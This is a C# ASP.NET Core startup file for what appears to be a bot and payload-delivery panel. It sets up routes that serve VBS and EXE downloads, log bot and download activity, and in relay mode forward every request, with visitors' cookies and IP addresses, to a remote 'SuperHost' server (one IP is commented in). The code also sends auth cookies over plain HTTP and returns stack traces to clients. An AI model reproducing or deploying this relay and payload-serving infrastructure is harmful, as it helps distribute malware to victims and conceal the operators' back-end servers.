using System.Net;
using System.Text;
using cp.Controllers;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.FileProviders;
using model;

namespace cp;

public static class Program
{
    public static string SuperHost => System.Environment.GetEnvironmentVariable("SuperHost", EnvironmentVariableTarget.Machine)!;

    //public static string SuperHost => "185.247.141.76";

    public static string RemoteUrl => $"http://{SuperHost}";

    public static bool IsSuperHost => !string.IsNullOrEmpty(SuperHost);

    public static async Task Main(string[] args)
    {
        await BackSvc.DoWork();

        var builder = WebApplication.CreateBuilder(args);

        builder.Services.AddSingleton<ServerService>();
        builder.Services.AddHostedService<BackSvc>();
        builder.Services.AddMemoryCache();

        if (!IsSuperHost)
        {
            builder.Services.AddSession(options =>
            {
                options.IdleTimeout = TimeSpan.FromDays(7);
                options.Cookie.IsEssential = true;
                options.Cookie.HttpOnly = true;
                options.Cookie.SecurePolicy = CookieSecurePolicy.None;
                options.Cookie.SameSite = SameSiteMode.Lax;
                options.Cookie.Path = "/";
            });
            builder.Services.AddScoped<BotController>();
            builder.Services.AddScoped<StatsController>();
            builder.Services.AddControllersWithViews()
                .AddRazorPagesOptions(options => { options.Conventions.AllowAnonymousToPage("/"); });
            builder.Services.AddHttpContextAccessor();
            builder.Services.AddAuthentication(options =>
                {
                    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;
                })
                .AddCookie(options =>
                {
                    options.Cookie.Path = "/";
                    options.Cookie.Name = "UserAuthCookie";
                    options.Cookie.HttpOnly = true;
                    options.Cookie.SecurePolicy = CookieSecurePolicy.None; // Allow cookies over HTTP
                    options.Cookie.SameSite = SameSiteMode.Lax; // Ensure compatibility with most browsers
                    options.SlidingExpiration = false;
                    options.ExpireTimeSpan = TimeSpan.FromDays(7);
                    options.AccessDeniedPath = "/auth";
                    options.LoginPath = "/auth";
                    options.LogoutPath = "/auth/logout";
                });
            builder.Services.AddAuthorization(options =>
            {
                options.AddPolicy("AllowFromIpRange", policy =>
                    policy.RequireAssertion(context =>
                    {
                        var httpContext = context.Resource as HttpContext;
                        if (httpContext == null)
                        {
                            return false;
                        }

                        var remoteIp = httpContext.Connection.RemoteIpAddress?.ToString();
                        bool isAuthenticated = httpContext.User.Identity?.IsAuthenticated ?? false;
                        bool isIpAllowed = BackSvc.IsIpAllowed(remoteIp);
                        return isAuthenticated || isIpAllowed;
                    }));
            });
        }

        var app = builder.Build();

        app.UseDeveloperExceptionPage();

        FtpServe(app);
        DataServe(app);

        if (IsSuperHost)
        {
            ForwarderMode(app);
        }
        else
        {
            app.UseRouting();
            app.UseSession();
            app.UseAuthentication();
            app.UseAuthorization();
            app.MapControllers();

        }

        await app.RunAsync();
    }

    public static void FtpServe(WebApplication app)
    {
        app.UseStaticFiles(new StaticFileOptions
        {
            FileProvider = new PhysicalFileProvider(ServerModelLoader.PublishedAdsDirStatic),
            RequestPath = "/ftp"
        });
    }

    public static void DataServe(WebApplication app)
    {
        var allIps = BackSvc.GetPublicIPv4Addresses();
        var rec = BackSvc.Map.FirstOrDefault(a => allIps.Contains(a.Value));
        if (string.IsNullOrEmpty(rec.Value))
            return;
        var path = System.IO.Path.Join(ServerModelLoader.RootDataStatic, rec.Value);
        app.UseStaticFiles(new StaticFileOptions
        {
            FileProvider = new PhysicalFileProvider(path),
            RequestPath = $"/data"
        });
    }


    private static void ForwarderMode(WebApplication app)
    {
        app.Map("/admin", async context => { await ForwardRequest(context); });
        app.Map("/upsert", async context => { await ForwardRequest(context); });
        app.Map("/update", async context => { await ForwardRequest(context); });

        app.Map("/auth", async context => { await ForwardRequest(context); });
        app.Map("/auth/logout", async context => { await ForwardRequest(context); });

// Place the most specific routes first
        app.Map("/{profile}/{random}/{target}/DnLog", async context => { await ForwardRequest(context); });
        app.Map("/{profile}/{random}/{target}/GetVbs", async context => { await ForwardRequest(context); });
        app.Map("/{profile}/GetVbsPhp", async context => { await ForwardRequest(context); });

// Place routes with a single parameter next
        app.Map("/upsert", async context => { await ForwardRequest(context); });
        app.Map("/update", async context => { await ForwardRequest(context); });
        app.Map("/stats/dayly", async context => { await ForwardRequest(context); });
        app.Map("/stats/botlog", async context => { await ForwardRequest(context); });
        app.Map("/stats/downloadlog", async context => { await ForwardRequest(context); });
        app.Map("/GetIcon", async context => { await ForwardRequest(context); });
        app.Map("/GetExe", async context => { await ForwardRequest(context); });
        app.Map("/GetExeMono", async context => { await ForwardRequest(context); });


// Finally, place the catch-all route
        app.Map("/", async context => { await ForwardRequest(context); });
    }

    private static async Task ForwardRequest(HttpContext context)
    {
        try
        {
            await ForwardRequestX(context);
        }
        catch (Exception e)
        {
            await context.Response.WriteAsync(e.Message + " " + e.StackTrace);
        }
    }

    private static async Task ForwardRequestX(HttpContext context)
    {
        var server = BackSvc.EvalServer(context.Request);
        using var handler = new HttpClientHandler
        {
            AllowAutoRedirect = false
        };
        using var client = new HttpClient(handler);

        var path = context.Request.Path.ToString();
        var targetUrl = $"{RemoteUrl}{path}{context.Request.QueryString}";


        // Make sure the target URL is absolute
        Uri.TryCreate(targetUrl, UriKind.Absolute, out var uri);
        if (uri == null)
        {
            throw new InvalidOperationException($"Invalid request URI: {targetUrl}");
        }

        var requestMessage = new HttpRequestMessage
        {
            Method = new HttpMethod(context.Request.Method),
            RequestUri = uri
        };

        // Copy general headers
        foreach (var header in context.Request.Headers)
        {
            if (!requestMessage.Headers.TryAddWithoutValidation(header.Key, (IEnumerable<string>)header.Value))
            {
                // Only add to content headers if the request has content
                if (context.Request.ContentLength > 0)
                {
                    if (requestMessage.Content == null)
                    {
                        requestMessage.Content = new StreamContent(context.Request.Body);
                    }

                    requestMessage.Content.Headers.TryAddWithoutValidation(header.Key,
                        (IEnumerable<string>)header.Value);
                }
            }
        }

        // Copy cookies if present
        if (context.Request.Cookies.Count > 0)
        {
            var cookieHeader = string.Join("; ",
                context.Request.Cookies.Select(cookie => $"{cookie.Key}={cookie.Value}"));
            requestMessage.Headers.Add("Cookie", cookieHeader);
        }

        requestMessage.Headers.Add("HTTP_X_FORWARDED_FOR", context.Connection.RemoteIpAddress.ToString());
        requestMessage.Headers.Add("HTTP_X_SERVER", server);

        HttpResponseMessage responseMessage;

        responseMessage = await HandleRedirect(handler, client, requestMessage);

        // Copy status code
        context.Response.StatusCode = (int)responseMessage.StatusCode;

        // Copy response headers
        foreach (var header in responseMessage.Headers)
        {
            context.Response.Headers[header.Key] = header.Value.ToArray();
        }

        foreach (var header in responseMessage.Content.Headers)
        {
            context.Response.Headers[header.Key] = header.Value.ToArray();
        }

        if (responseMessage.Headers.Contains("Set-Cookie"))
        {
            var cookies = responseMessage.Headers.GetValues("Set-Cookie");
            foreach (var cookie in cookies)
            {
                context.Response.Headers.Append("Set-Cookie", cookie);
            }
        }

        context.Response.Headers.Remove("transfer-encoding");

        // Copy response content
        await responseMessage.Content.CopyToAsync(context.Response.Body);
    }

    private static async Task<HttpResponseMessage> HandleRedirect(HttpClientHandler handler, HttpClient client,
        HttpRequestMessage requestMessage)
    {
        HttpResponseMessage responseMessage;
        var cookieCollection = new List<string>(); // Collection to store cookies across redirects

        do
        {
            responseMessage = await client.SendAsync(requestMessage);

            if (handler.AllowAutoRedirect)
                return responseMessage;

            // Handle redirect responses
            if ((int)responseMessage.StatusCode >= 300 && (int)responseMessage.StatusCode < 400)
            {
                var location = responseMessage.Headers.Location;
                if (location == null)
                {
                    break;
                }

                // Extract and store cookies from the redirect response
                if (responseMessage.Headers.Contains("Set-Cookie"))
                {
                    var cookies = responseMessage.Headers.GetValues("Set-Cookie");
                    foreach (var cookie in cookies)
                    {
                        var cookieValue = cookie.Split(';')[0]; // Take only the key=value part
                        if (!cookieCollection.Contains(cookieValue)) // Avoid duplicates
                        {
                            cookieCollection.Add(cookieValue);
                        }
                    }
                }

                // Combine cookies and add them to the request
                var combinedCookies = string.Join("; ", cookieCollection);
                requestMessage.Headers.Remove("Cookie");
                if (!string.IsNullOrEmpty(combinedCookies))
                {
                    requestMessage.Headers.Add("Cookie", combinedCookies);
                }

                // Prepare the next request
                requestMessage = new HttpRequestMessage
                {
                    Method = HttpMethod.Get,
                    RequestUri = location
                };

                // Handle potential issues with PathAndQuery
                var pq = "/";
                try
                {
                    pq = location.PathAndQuery;
                }
                catch
                {
                    pq = "/";
                }

                requestMessage.RequestUri = new Uri(RemoteUrl + pq);
            }
            else
            {
                break;
            }
        } while (responseMessage.StatusCode == HttpStatusCode.Redirect ||
                 responseMessage.StatusCode == HttpStatusCode.MovedPermanently);

        return responseMessage;
    }
}